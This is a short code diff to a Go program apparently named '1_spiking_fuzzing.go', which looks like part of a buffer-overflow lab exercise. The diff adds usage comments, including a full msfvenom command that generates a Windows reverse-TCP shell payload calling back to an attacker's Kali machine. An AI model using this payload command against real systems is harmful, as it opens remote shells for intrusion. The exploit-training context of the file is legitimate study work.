@@ -7,6 +7,13 @@ import (
 	"strings"
 )
 
+/* Usage:
+   go run 1_spiking_fuzzing.go <IP Address> <Port>
+*/
+
+//Generate a payload:
+//msfvenom -p windows/shell_reverse_tcp LHOST=<IP Address of Kali Machine> LPORT=<Port of Kali Machine> -f c -a x86 --platform windows -b "\x00\x0A"
+
 func main() {
 	ip := os.Args[1]
 	port := os.Args[2]
